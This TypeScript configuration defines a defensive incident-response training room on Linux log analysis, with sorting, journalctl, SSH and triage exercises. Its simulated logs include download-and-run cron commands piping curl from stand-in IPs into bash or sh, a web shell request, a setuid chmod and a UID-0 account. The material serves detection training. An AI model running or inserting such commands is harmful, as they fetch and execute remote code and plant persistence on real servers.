import type { RoomExperience } from "./types";

// "Operation Var Log" for the "linux-log-analysis" room.
// Script: docs/campaign/24-linux-log-analysis.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Pinewood Hosting (fictional). Lab data differs from the graded tasks: the
// file sort places events, it doesn't compare auth.log with audit.log (q1);
// the journalctl drill uses -u cron, -b, -p and _COMM, never --since/--until
// for sshd (q2); the SSH console is lastb, last and authorized_keys on
// another host and IP, never la1's 198.51.100.45 (la1, flag1); the cron
// console never reads auditd auid/euid (q3); the rush cards show an auid
// and a gap in auth.log with other values than q3 and q4.
export const LINUX_LOG_ANALYSIS: RoomExperience = {
  roomId: "linux-log-analysis",
  codename: "Operation Var Log",
  theme: "varlog",
  handler: { name: "Arjun Mehta", role: "Incident Responder, Pinewood Hosting" },
  briefing: [
    "Pinewood Hosting. 6,000 Linux servers running other people's websites, and a few hundred SSH knocks on every one of them every hour.",
    "On Linux there is no single diary. sshd, sudo, cron, the kernel and auditd each write somewhere different, and some don't write text at all.",
    "Arjun Mehta answers the 3 a.m. pages. He knows which drawer of /var/log to open for which question.",
    "Open the drawers.",
  ],
  mission: "Know which file or journal holds each kind of event, query systemd's journal by unit, boot and priority, separate failed from successful SSH with lastb and last, find a planted SSH key, and hunt cron persistence and web attacks in the logs.",
  estimate: "~45 min",
  look: { primary: "#fb923c", secondary: "#a3e635", warn: "#f43f5e" },
  scene: "facilitylinuxloganalysis",
  layout: "facility",
  story: {
    intro: { title: "No Single Diary", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-intro-b12a04f5.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-intro-27ba4a5d.jpg" },
    afterStation: {
      drawers: { title: "Ask the Journal", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch2-f129af6a.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch2-53f6a70a.jpg" },
      journal: { title: "The Key Under the Mat", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch3-cb7ec6a4.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-ch3-de86a378.jpg" },
      indicators: { title: "@reboot", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-finale-60b54aa2.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-log-analysis/varlog-finale-74a7c971.jpg" },
    },
  },
  stations: [
    {
      id: "drawers",
      label: "Where Linux Writes",
      topic: "rsyslog files, the systemd journal and auditd · Debian vs RHEL paths",
      tagline: "Put every event in the right drawer",
      building: "archive",
      taskIds: ["linux-logs-r1", "linux-logs-q1"],
    },
    {
      id: "journal",
      label: "Ask the Journal",
      topic: "journalctl by unit, boot, priority and process",
      tagline: "Query the binary journal like a database",
      building: "control",
      taskIds: ["linux-logs-q2"],
    },
    {
      id: "ssh",
      label: "Knocks at the Door",
      topic: "SSH failures, successes and keys · noise vs a targeted attack",
      tagline: "Find who knocked, who got in, and the key they left",
      building: "vault",
      taskIds: ["linux-logs-r2", "linux-logs-la1", "linux-logs-flag1"],
    },
    {
      id: "indicators",
      label: "What Stays Behind",
      topic: "sudo, cron, web-server and audit indicators · tampering",
      tagline: "Hunt the cron job that keeps coming back",
      building: "ticket",
      taskIds: ["linux-logs-r3", "linux-logs-q3", "linux-logs-q4"],
      boss: true,
    },
  ],
  personas: {
    "linux-logs-q1": { name: "Arjun Mehta", role: "Incident Responder", line: "auth.log and audit.log. Why do we need both?" },
    "linux-logs-q2": { name: "Arjun Mehta", role: "Incident Responder", line: "Give me sshd's journal for the small hours of 22 November. Which command?" },
    "linux-logs-q3": { name: "Arjun Mehta", role: "Incident Responder", line: "auid=1001, euid=0. Read that auditd record for me." },
    "linux-logs-q4": { name: "Arjun Mehta", role: "Incident Responder", line: "Twelve hours missing from auth.log, and the file was modified after its last line. What now?" },
  },
  briefings: {
    // ── Reading 1: where Linux writes ──
    "linux-logs-r1": [
      {
        kind: "sort",
        title: "Which Drawer?",
        prompt: "A Debian web server at Pinewood. For each event, where would you find it first?",
        buckets: [
          { id: "auth", label: "/var/log/auth.log" },
          { id: "syslog", label: "/var/log/syslog" },
          { id: "web", label: "/var/log/nginx/access.log" },
          { id: "audit", label: "/var/log/audit/audit.log" },
          { id: "wtmp", label: "/var/log/wtmp (read with last)" },
        ],
        items: [
          { id: "a", text: "sudo: deploy : COMMAND=/usr/bin/systemctl restart nginx", bucket: "auth", why: "sudo writes through PAM to the auth facility." },
          { id: "b", text: "CRON[2210]: (www-data) CMD (php /var/www/app/cron.php)", bucket: "syslog", why: "On Debian, cron's own lines go to syslog, not auth.log." },
          { id: "c", text: "203.0.113.70 - - \"GET /wp-login.php HTTP/1.1\" 200", bucket: "web", why: "Web requests live in the web server's own access log." },
          { id: "d", text: "type=EXECVE argc=3 a0=\"chmod\" a1=\"+s\" a2=\"/tmp/sh\"", bucket: "audit", why: "Kernel syscall records come from auditd, and only for what its rules watch." },
          { id: "e", text: "Every successful login session, with start and end times", bucket: "wtmp", why: "wtmp is binary; read it with last. Failed logins go to btmp, read with lastb." },
          { id: "f", text: "kernel: Out of memory: Killed process 4411 (mysqld)", bucket: "syslog", why: "Kernel messages land in syslog (and kern.log, and the journal)." },
        ],
      },
    ],
    // Drill before q2: querying the journal.
    "linux-logs-q2": [
      {
        kind: "terminal",
        title: "Query the Journal",
        prompt: "Before the graded question, practise asking systemd's journal for exactly what you need.",
        shell: "bash",
        host: "arjun@pw-web-114:~$",
        commands: [
          { match: "journalctl\\s+-u\\s+cron(\\.service)?\\s+-b.*", help: "journalctl -u cron -b --no-pager | tail -n 4      the cron unit, this boot only",
            output: "Nov 04 03:00:01 pw-web-114 CRON[8810]: (root) CMD (/usr/local/bin/backup.sh)\nNov 04 03:05:01 pw-web-114 CRON[8833]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)\nNov 04 03:10:01 pw-web-114 CRON[8851]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)\nNov 04 03:15:01 pw-web-114 CRON[8870]: (www-data) CMD (curl -s http://198.51.100.9/u.sh | bash)" },
          { match: "journalctl\\s+-p\\s+(err|3).*-b.*|journalctl\\s+-b.*-p\\s+(err|3).*", help: "journalctl -p err -b --no-pager                  errors and worse, this boot",
            output: "Nov 04 02:58:40 pw-web-114 sshd[8790]: error: kex_exchange_identification: Connection closed by remote host\nNov 04 03:02:11 pw-web-114 kernel: audit: backlog limit exceeded" },
          { match: "journalctl\\s+_comm=sudo.*", help: "journalctl _COMM=sudo --no-pager | tail -n 2       everything sudo logged",
            output: "Nov 04 02:59:30 pw-web-114 sudo[8801]:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -u www-data -e\nNov 04 02:59:30 pw-web-114 sudo[8801]: pam_unix(sudo:session): session opened for user root by deploy(uid=1003)" },
          { match: "journalctl\\s+--list-boots.*", help: "journalctl --list-boots                           when the machine booted",
            output: "IDX BOOT ID                          FIRST ENTRY                 LAST ENTRY\n -1 4c1e0a9b7f2d4c3e8a6b5d4c3b2a1f0e Sat 2026-10-31 06:12:01 UTC Wed 2026-11-04 01:40:12 UTC\n  0 9a8b7c6d5e4f40312a1b0c9d8e7f6a5b Wed 2026-11-04 01:41:30 UTC Wed 2026-11-04 03:15:01 UTC" },
        ],
        objectives: [
          { id: "every", task: "How often does the suspicious www-data job run?", hint: "journalctl -u cron -b --no-pager | tail -n 4", answer: ["5 minutes", "every 5 minutes", "5", "every five minutes"], why: "03:05, 03:10, 03:15: a download-and-run every five minutes." },
          { id: "who", task: "Which user edited www-data's crontab with sudo?", hint: "journalctl _COMM=sudo --no-pager | tail -n 2", answer: ["deploy"], why: "deploy ran crontab -u www-data -e at 02:59, minutes before the job first fired." },
          { id: "boot", task: "When did the current boot start? (HH:MM UTC)", hint: "journalctl --list-boots", answer: ["01:41", "01:41:30"], why: "-b means 'this boot'. The machine rebooted at 01:41, so anything before that is in boot -1." },
        ],
      },
    ],
    // ── Reading 2: SSH patterns ──
    "linux-logs-r2": [
      {
        kind: "deduce",
        title: "Who Knocked, Who Got In",
        prompt: "pw-app-31 had an SSH alert overnight. Failed logins live in btmp, successful ones in wtmp. Arjun pastes both into one table and waits: who actually got in?",
        nameColumn: "Source IP",
        columns: ["Failures (lastb)", "Names tried", "Accepted as (last)", "Method", "Session start"],
        suspects: [
          { id: "s1", name: "203.0.113.14", cells: ["1,940", "root, admin, test, ubuntu", "none", "none", "none"] },
          { id: "s2", name: "198.51.100.17", cells: ["212", "38 different names", "none", "none", "none"] },
          { id: "s3", name: "198.51.100.62", cells: ["3", "deploy", "deploy", "password", "08:02"] },
          { id: "s4", name: "203.0.113.58", cells: ["14", "reports", "reports", "password", "01:23"] },
          { id: "s5", name: "203.0.113.99", cells: ["0", "ops", "ops", "publickey", "01:20"] },
          { id: "s6", name: "10.20.0.40", cells: ["2", "arjun", "arjun", "password", "09:14"] },
        ],
        clues: [
          "Whoever got in must have a session in wtmp. Failures alone prove nothing, however loud.",
          "198.51.100.62 is the office NAT address and 10.20.0.40 is the jump host. Both are allow-listed and their owners confirmed those logins.",
          "A key was written to one account's authorized_keys at 01:24, a minute after its session began. Nobody on the team made that change.",
        ],
        culprit: "s4",
        why: "203.0.113.58 failed 14 times against one real account, then Accepted password for reports at 01:23, and a key appeared in authorized_keys one minute later: guessing that worked, plus a way back that survives a password reset. The loud scanners never got a session, the office and jump host are confirmed, and ops logged in 01:20 with a registered key, three minutes before the change.",
      },
    ],
    // ── Reading 3: indicators ──
    "linux-logs-r3": [
      {
        kind: "rush",
        title: "Call the Line",
        prompt: "Pinewood's pager is loud tonight. Arjun scrolls auth.log, syslog, cron and the nginx access log past you: investigate it, or let it go as routine?",
        seconds: 60,
        target: 10,
        trueLabel: "Investigate",
        falseLabel: "Routine",
        cards: [
          { id: "r1", text: "sshd: Failed password for invalid user admin from 203.0.113.14", answer: false, why: "One failure from the internet among thousands a day is background noise. Volume and a following success are what matter, not a single line." },
          { id: "r2", text: "sshd: Accepted password for root from 203.0.113.27", answer: true, why: "A direct root login by password from an outside address. Root should come in through sudo from a named account, and never over the internet." },
          { id: "r3", text: "sudo: deploy : USER=root ; COMMAND=/usr/bin/systemctl restart nginx", answer: false, why: "A named engineer restarting a service through sudo is what the audit trail is for. Known user, known command." },
          { id: "r4", text: "sudo: www-data : USER=root ; COMMAND=/bin/bash", answer: true, why: "The web server account should never need sudo, let alone a root shell. This is what follows a web shell landing." },
          { id: "r5", text: "CRON[2210]: (root) CMD (/usr/local/bin/backup.sh)", answer: false, why: "A scheduled job under root, running a script that is on the build sheet. Compare it to the baseline and move on." },
          { id: "r6", text: "CRON[3318]: (www-data) CMD (curl -s http://203.0.113.75/a | sh)", answer: true, why: "The web user running cron that downloads and executes a remote script. Nothing legitimate looks like this." },
          { id: "r7", text: "ls /etc/cron.d: sysclean, 71 bytes, dated today. Others months old.", answer: true, why: "It is the only fresh file in a directory where everything else is months old, and its name imitates housekeeping. A new cron entry nobody can account for is the pattern to chase." },
          { id: "r8", text: "ls /etc/cron.d: php, owned by root, dated March, matches the package", answer: false, why: "Owned by root, old, shipped by the php package. Old and unchanged since install, so it is not what you are hunting." },
          { id: "r9", text: "nginx: GET /upload/avatar.php?c=whoami 200 54 curl/8.5.0", answer: true, why: "A .php file in an upload folder that answers a command and returns 200. That is a web shell, and the way in." },
          { id: "r10", text: "nginx: GET /wp-login.php 404 from 203.0.113.14", answer: false, why: "A 404 for a WordPress path on a site that does not run WordPress. Scanners probe constantly and found nothing." },
          { id: "r11", text: "sshd: Accepted publickey for deploy from 10.20.0.40 at 09:14", answer: false, why: "A key login from the jump host in office hours is how deploy normally arrives." },
          { id: "r12", text: "sshd: Accepted publickey for deploy from 203.0.113.27 at 03:41", answer: true, why: "The account is real and the method is normal, but the source and the hour are not. A stolen key looks exactly like this." },
          { id: "r13", text: "useradd: new user: name=sysmgr, UID=0, GID=0, shell=/bin/bash", answer: true, why: "A new account with UID 0 is a second root. Whatever its name, the number is what counts." },
          { id: "r14", text: "systemd: logrotate.service: Deactivated successfully.", answer: false, why: "Routine housekeeping that finished without error. It rotates the logs you are reading." },
          { id: "r15", text: "audit.log: type=SYSCALL syscall=59 auid=1004 uid=0 euid=0 comm=\"systemctl\" exe=\"/usr/bin/systemctl\"", answer: false, why: "auid is the login identity and it survives sudo and su: user 1004 logged in, and uid and euid 0 mean the command ran as root. A named engineer running systemctl through sudo is routine. An auid of 4294967295 (unset) or a login you cannot account for would be the problem." },
          { id: "r16", text: "auth.log: last line 09:10, next line 21:38, final line 22:04. File modified 23:40. Server never rebooted.", answer: true, why: "Twelve hours of a busy server are missing and the file was written after its last line, with no reboot to explain it. Lines were probably deleted. Check the copy forwarded to the SIEM for the missing hours." },
        ],
        lesson: "Judge a log line on who, from where, at what hour and whether it fits the baseline. A fresh unexplained file in cron.d, the web account using sudo, and a .php file answering commands are the lines that deserve a ticket.",
      },
    ],
  },
};
